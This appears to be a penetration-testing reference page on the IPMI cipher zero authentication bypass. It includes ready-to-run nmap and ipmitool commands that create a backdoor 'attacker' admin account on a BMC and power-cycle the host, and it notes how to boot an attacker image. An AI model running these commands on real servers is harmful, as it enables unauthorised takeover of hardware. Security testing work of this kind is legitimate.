---
title: "IPMI cipher 0 bypass: authentication-free BMC command execution"
order: 1
description: "IPMI 2.0 cipher suite zero disables authentication and integrity for the session. A BMC that permits it may accept an arbitrary password for a valid account name, with the resulting access limited by that account's channel privilege."
keywords:
  - ipmi cipher 0
  - cipher zero
  - bmc
  - authentication bypass
  - ipmitool
---

# IPMI cipher 0 bypass

IPMI 2.0 negotiates a cipher suite for each session, and cipher suite zero uses no authentication or integrity algorithms. Some BMCs accept it over the network. On a vulnerable controller, the password is not validated, but the client still needs a valid account name and receives the privilege that account is allowed on the channel. If the known account has administrator privilege, the attacker can perform high-impact operations such as changing users, configuration, power state, or boot settings.

```bash
# detect cipher 0 acceptance
nmap -sU -p623 --script ipmi-cipher-zero <target>
# use a known valid account; cipher 0 causes the password to be ignored
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user list          # enumerate users
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set name 5 attacker
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set password 5 Passw0rd!
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user priv 5 4        # admin
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' chassis power cycle  # control the host
```

## Exploitation notes

- `-C 0` selects cipher zero in ipmitool. The password can be arbitrary, but the username must identify a valid account and its configured channel privilege determines which commands succeed.
- User creation and other administrative operations require a valid account with sufficient privilege; cipher-zero acceptance alone does not guarantee administrator access.
- Administrative BMC control means host power, boot-device selection, console, and virtual media, enough to boot the server from an attacker image and compromise the OS, see [iDRAC and iLO](idrac-and-ilo.md) for the virtual-media step.
- This is an authentication bypass over UDP 623. Its demonstrated impact should be based on the privileges of the valid account used during the test.

## Tools

- [ipmitool](https://github.com/ipmitool/ipmitool)
- [nmap ipmi-cipher-zero](https://nmap.org/nsedoc/scripts/ipmi-cipher-zero.html)

## References

- [IPMI 2.0 cipher suites](https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html)
- [Dan Farmer: IPMI/BMC security](http://fish2.com/ipmi/)
